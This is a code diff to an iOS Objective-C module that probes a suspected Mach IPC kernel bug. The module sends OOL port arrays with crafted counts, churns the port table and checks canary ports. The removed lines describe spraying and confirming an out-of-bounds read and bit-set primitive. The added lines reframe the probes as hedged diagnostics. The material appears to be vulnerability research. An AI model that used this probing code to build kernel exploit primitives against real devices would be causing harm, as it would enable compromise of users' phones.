@@ -3,6 +3,7 @@
 #import "KPLog.h"
 #import <mach/mach.h>
 #import <mach/message.h>
+#import <mach_debug/ipc_info.h>
 
 @interface KPAuditIPCModule ()
 @property (nonatomic, copy) NSString *identifier;
@@ -87,7 +88,7 @@
         return result;
     }
 
-    // RECEIVE — this is where ipc_port_translate_receive runs (the OOB site).
+    // Receive translation path; a descriptor-count mismatch alone is not an OOB oracle.
     size_t rcvTotal = total + 64;
     uint8_t *rcv = calloc(1, rcvTotal);
     mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
@@ -96,12 +97,20 @@
     kr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)rcvTotal,
                   port, 250, MACH_PORT_NULL);
     result[@"recv_kr"] = @(kr);
-    if (kr == KERN_SUCCESS) {
+    if (kr == KERN_SUCCESS && rh->msgh_size >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
         mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
         result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
-        // OOB oracle: kernel delivered more descriptors than we sent
         if (rb->msgh_descriptor_count > count) {
-            result[@"oob_desc"] = @(rb->msgh_descriptor_count - count);
+            result[@"unexpected_desc_delta"] = @(rb->msgh_descriptor_count - count);
+        }
+        size_t available = (rh->msgh_size - sizeof(mach_msg_header_t) - sizeof(mach_msg_body_t)) / descSize;
+        uint32_t descriptorsToRelease = MIN((size_t)rb->msgh_descriptor_count, available);
+        uint8_t *receivedBase = rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+        for (uint32_t i = 0; i < descriptorsToRelease; i++) {
+            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(receivedBase + i * descSize);
+            if (pd->type == MACH_MSG_PORT_DESCRIPTOR && pd->name != MACH_PORT_NULL) {
+                mach_port_deallocate(mach_task_self(), pd->name);
+            }
         }
     }
     free(rcv);
@@ -109,9 +118,8 @@
     return result;
 }
 
-// Churn the ipc entry table: allocate many rights then free every other one —
-// the fix also touched ipc_entry_grow_table, so the bug lives near a table
-// growth/free boundary.
+// Churn the ipc entry table around the changed growth/free path.
+// This creates lifecycle pressure only; it does not localize or prove a bug.
 - (void)churnItableWithPorts:(NSMutableArray *)held count:(int)count {
     for (int i = 0; i < count; i++) {
         mach_port_t p = MACH_PORT_NULL;
@@ -125,6 +133,84 @@
             }
         }
     }
+}
+
+#pragma mark - ipc_entry_grow_table boundary diagnostics
+
+- (NSDictionary *)portSpaceBasicSnapshot {
+    ipc_info_space_basic_t info = {0};
+    kern_return_t kr = mach_port_space_basic_info(mach_task_self(), &info);
+    return @{
+        @"kr": @(kr), @"table_size": @(info.iisb_table_size),
+        @"table_inuse": @(info.iisb_table_inuse),
+    };
+}
+
+- (NSDictionary *)runIPCEntryGrowthDiagnosticAtPort:(mach_port_t)port sendRight:(mach_port_t)sendRight {
+    NSDictionary *initial = [self portSpaceBasicSnapshot];
+    if ([initial[@"kr"] intValue] != KERN_SUCCESS) {
+        return @{@"status": @"SPACE_INFO_FAILED", @"initial": initial};
+    }
+    uint32_t initialSize = [initial[@"table_size"] unsignedIntValue];
+    if (initialSize < 2 || initialSize > 1024) {
+        return @{@"status": @"BASELINE_OUTSIDE_BOUNDED_RANGE", @"initial": initial};
+    }
+
+    uint32_t targets[] = {
+        initialSize - 1, initialSize, initialSize + 1,
+        initialSize * 2 - 1, initialSize * 2, initialSize * 2 + 1,
+    };
+    NSMutableArray *rounds = [NSMutableArray array];
+    for (size_t round = 0; round < sizeof(targets) / sizeof(targets[0]); round++) {
+        uint32_t target = targets[round];
+        NSDictionary *before = [self portSpaceBasicSnapshot];
+        uint32_t beforeInUse = [before[@"table_inuse"] unsignedIntValue];
+        if ([before[@"kr"] intValue] != KERN_SUCCESS || target <= beforeInUse) {
+            [rounds addObject:@{@"target_inuse": @(target), @"before": before,
+                                @"status": @"TARGET_BELOW_BASELINE_OR_INFO_FAILED"}];
+            continue;
+        }
+
+        NSMutableArray *allocated = [NSMutableArray array];
+        uint32_t allocationFailures = 0;
+        kern_return_t lastAllocationKR = KERN_SUCCESS;
+        while (beforeInUse + allocated.count < target && allocated.count < 2048) {
+            mach_port_t name = MACH_PORT_NULL;
+            lastAllocationKR = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &name);
+            if (lastAllocationKR != KERN_SUCCESS) {
+                allocationFailures++;
+                break;
+            }
+            [allocated addObject:@(name)];
+        }
+
+        NSDictionary *afterAllocation = [self portSpaceBasicSnapshot];
+        NSDictionary *message = [self sendReceiveCount:1 port:port sendRight:sendRight];
+        uint32_t destroyFailures = 0;
+        for (NSNumber *name in allocated) {
+            kern_return_t dkr = mach_port_destroy(mach_task_self(), (mach_port_t)name.unsignedIntValue);
+            if (dkr != KERN_SUCCESS) destroyFailures++;
+        }
+        NSDictionary *afterFree = [self portSpaceBasicSnapshot];
+        [rounds addObject:@{
+            @"target_inuse": @(target), @"before": before,
+            @"allocated": @(allocated.count), @"last_allocate_kr": @(lastAllocationKR),
+            @"allocate_failures": @(allocationFailures),
+            @"after_allocate": afterAllocation,
+            @"table_grew": @([afterAllocation[@"table_size"] unsignedIntValue] >
+                             [before[@"table_size"] unsignedIntValue]),
+            @"send_kr": message[@"send_kr"] ?: @(-1),
+            @"recv_kr": message[@"recv_kr"] ?: @(-1),
+            @"recv_desc_count": message[@"recv_desc_count"] ?: @0,
+            @"destroy_failures": @(destroyFailures), @"after_free": afterFree,
+            @"inuse_restored": @([afterFree[@"table_inuse"] unsignedIntValue] == beforeInUse),
+        }];
+    }
+    return @{
+        @"shape": @"ipc_entry_grow_table allocate/free + one-descriptor send/receive",
+        @"initial": initial, @"rounds": rounds,
+        @"oracle": @"table size/inuse and kr values only; accepted messages do not prove OOB or UAF",
+    };
 }
 
 #pragma mark - Diagnostics: which message shape is rejected
@@ -190,8 +276,9 @@
 #pragma mark - OOL ports array: crafted count (the ool_port_array lane)
 
 // mach_msg_ool_ports_descriptor_t carries an ARRAY of ports + a count field.
-// The 26.0 fix "ool_port_array_enforced" and the 27.2 bounds check both point
-// here: a count larger than the real array drives the translate walk OOB.
+// This lane varies valid versus deliberately invalid entries and records the
+// validation boundary. The allocation always covers `count`; no userspace OOB
+// read or kernel OOB transfer is inferred from an accepted message.
 - (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
     return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:YES];
 }
@@ -281,7 +368,18 @@
         [report appendString:@"\nVERDICT: PORT_ALLOCATE_FAILED\n"];
         return report;
     }
-    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    kern_return_t insertKR = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    [report appendFormat:@"send-right insert kr=%d\n", insertKR];
+    if (insertKR != KERN_SUCCESS) {
+        mach_port_destroy(mach_task_self(), port);
+        [report appendString:@"\nVERDICT: SEND_RIGHT_INSERT_FAILED\n"];
+        return report;
+    }
+
+    NSDictionary *growth = [self runIPCEntryGrowthDiagnosticAtPort:port sendRight:port];
+    [report appendString:@"\n--- ipc_entry_grow_table measured boundary matrix ---\n"];
+    [report appendFormat:@"%@\n", growth];
+    [self journal:[NSString stringWithFormat:@"GROWTH_MATRIX %@", growth]];
 
     NSMutableArray *held = [NSMutableArray array];
     [self churnItableWithPorts:held count:512];
@@ -309,9 +407,9 @@
         [self journal:[NSString stringWithFormat:@"sweep count=%u %@", counts[i], r]];
     }
 
-    [report appendString:@"\n--- OOL ports array: crafted count (ool_port_array lane) ---\n"];
-    // Buffer holds 64 real entries; count lies. If the translate walk trusts
-    // the count, the index runs off the end (the 27.2 bounds check's victim).
+    [report appendString:@"\n--- OOL ports array: validation matrix ---\n"];
+    // The first 64 entries are valid send rights; later entries are deliberately
+    // invalid names inside the same fully allocated backing buffer.
     uint32_t oolCounts[] = {1, 4, 16, 64, 65, 128, 256, 1024, 4096};
     for (size_t i = 0; i < sizeof(oolCounts)/sizeof(oolCounts[0]); i++) {
         NSDictionary *r = [self sendOOLPortsCount:oolCounts[i] realEntries:64 port:port sendRight:port];
@@ -320,34 +418,28 @@
                        oolCounts[i], r[@"send_kr"], r[@"recv_kr"]]];
     }
 
-    // Fine threshold sweep: every count from 64 to 96. This is where the
-    // off-by-one lives — find the exact MACH_SEND_INVALID_RIGHT boundary.
-    // OOB slots (past `real`) contain spray pattern 0x41000000+index.
-    [report appendString:@"\n--- OOL count threshold sweep (64..96, spray=0x41xxxxxx) ---\n"];
-    uint32_t lastOK = 0, threshold = 0, oobHits = 0;
+    [report appendString:@"\n--- OOL validation threshold (64..96 valid/invalid entries) ---\n"];
+    uint32_t lastOK = 0, threshold = 0, acceptedOversized = 0;
     for (uint32_t c = 64; c <= 96; c++) {
         NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port];
         [report appendFormat:@"%@\n", r];
-        [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_count=%@ oob=%@",
-                       c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_count"], r[@"oob_slots"]]];
+        [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_desc_count=%@",
+                       c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_desc_count"]]];
         if ([r[@"send_kr"] intValue] == 0) {
             lastOK = c;
+            if (c > 64 && [r[@"recv_kr"] intValue] == 0) acceptedOversized++;
         } else if (threshold == 0) {
             threshold = c;
         }
-        if (r[@"oob_slots"] != nil) {
-            oobHits++;
-        }
         usleep(2000);
     }
-    [report appendFormat:@"\nthreshold analysis: last_ok=%u threshold=%u delta=%u oob_hits=%u\n",
-     lastOK, threshold, threshold > 64 ? threshold - 64 : 0, oobHits];
-    if (oobHits > 0) {
-        [report appendString:@"OOB transfer CONFIRMED — kernel delivered more ports than allocated.\n"];
-        [report appendString:@"=> OOB read primitive is LIVE. Feed to translate_receive bit-set.\n"];
+    [report appendFormat:@"\nthreshold analysis: last_ok=%u first_rejection=%u delta=%u accepted_oversized=%u\n",
+     lastOK, threshold, threshold > 64 ? threshold - 64 : 0, acceptedOversized];
+    if (acceptedOversized > 0) {
+        [report appendString:@"Some counts with invalid entries were accepted; this is a validation observation only.\n"];
+        [report appendString:@"The backing allocation covers every count, so no OOB transfer is demonstrated.\n"];
     } else if (threshold > 0) {
-        [report appendString:@"No OOB slots observed — kernel may clamp silently.\n"];
-        [report appendString:@"Next: debugserver watchpoints on the ports array alloc.\n"];
+        [report appendFormat:@"First rejected count: %u; inspect send_kr/recv_kr rather than inferring a clamp.\n", threshold];
     }
 
     // --- translate_receive bit-set canary ---
@@ -428,22 +520,21 @@
                                      ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
         if (skr != KERN_SUCCESS) {
             targetedDead++;
-            [report appendFormat:@"TARGETED HIT: port=%u name=%u DEAD after w2=%u trigger (send_kr=%d)\n",
+            [report appendFormat:@"TARGETED SEND FAILURE: port=%u name=%u after w2=%u (send_kr=%d)\n",
              canary[i], w2, w2, skr];
         } else {
             mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
         }
     }
-    [report appendFormat:@"targeted result: %d triggers, %d ports killed\n", targeted, targetedDead];
+    [report appendFormat:@"targeted result: %d attempts, %d send failures\n", targeted, targetedDead];
     if (targetedDead > 0) {
-        [report appendString:@"BIT-SET TARGETING CONFIRMED — w2 = OOL count = port table index.\n"];
+        [report appendString:@"Send failures are unverified lifecycle signals; w2 source and bit-set attribution are not proven.\n"];
     } else {
-        [report appendString:@"No targeted hits — w2 is NOT the OOL count.\n"];
-        [report appendString:@"Next: debugserver watchpoints to identify the real w2 source.\n"];
+        [report appendString:@"No targeted send-status delta observed; this does not identify or exclude an index source.\n"];
     }
 
 
-    // w2 discovery and OOB-value tests removed � they crashed the app.
+    // Earlier w2 discovery and OOB-value tests were removed after app crashes.
     // See journal for threshold sweep and canary results.
 
     // Snapshot again
@@ -461,20 +552,19 @@
                                      ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
         if (skr != KERN_SUCCESS) {
             changed++;
-            [report appendFormat:@"canary[%d] port=%u DEAD after trigger (send_kr=%d)\n", i, canary[i], skr];
+            canaryAlive[i] = 2;
+            [report appendFormat:@"canary[%d] port=%u send failure after trigger (send_kr=%d)\n", i, canary[i], skr];
         } else {
             mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
         }
     }
     int aliveAfter = 0;
     for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveAfter++;
-    [report appendFormat:@"canary after: %d/%d alive (changed=%d)\n", aliveAfter, CANARY_N, changed];
+    [report appendFormat:@"canary after: %d/%d send-capable (status_changes=%d)\n", aliveAfter, CANARY_N, changed];
     if (changed > 0) {
-        [report appendString:@"BIT-SET LANDED — translate_receive OOB write CONFIRMED.\n"];
-        [report appendString:@"Dead canaries = corrupted ipc_entry bits at the w2 offset.\n"];
+        [report appendString:@"CANARY_SEND_FAILURES_UNVERIFIED — independent table evidence is required for attribution.\n"];
     } else {
-        [report appendString:@"No canary change — bit-set may hit unmapped memory (no panic = mapped),\n"];
-        [report appendString:@"or translate_receive not reached. Next: debugserver watchpoints.\n"];
+        [report appendString:@"No canary send-status delta observed; no bit-set conclusion follows either way.\n"];
     }
 
     // Cleanup canaries
@@ -497,7 +587,7 @@
     for (NSNumber *p in held) {
         mach_port_destroy(mach_task_self(), (mach_port_t)p.unsignedIntValue);
     }
-    mach_port_deallocate(mach_task_self(), port);
+    mach_port_destroy(mach_task_self(), port);
 
     [report appendString:@"\nVERDICT: SEE_JOURNAL\n"];
     [report appendString:
@@ -506,8 +596,9 @@
      @"  complex0-id0 fails too     -> COMPLEX bit itself is filtered\n"
      @"  id0 works, id4b50 fails    -> msgh_id filtering (iOS mach message filter)\n"
      @"  everything works           -> the earlier failure was the 16B stride\n"
-     @"A panic anywhere = pull the log; far = base+16*index is the leak + control\n"
-     @"proof for the translate_receive OOB.\n"];
+     @"Growth rounds report table_size/table_inuse before and after allocation/free.\n"
+     @"Accepted messages and send failures are observations, not OOB/UAF proof.\n"
+     @"A panic requires independent symbolication and index/base correlation before attribution.\n"];
     return report;
 }
 
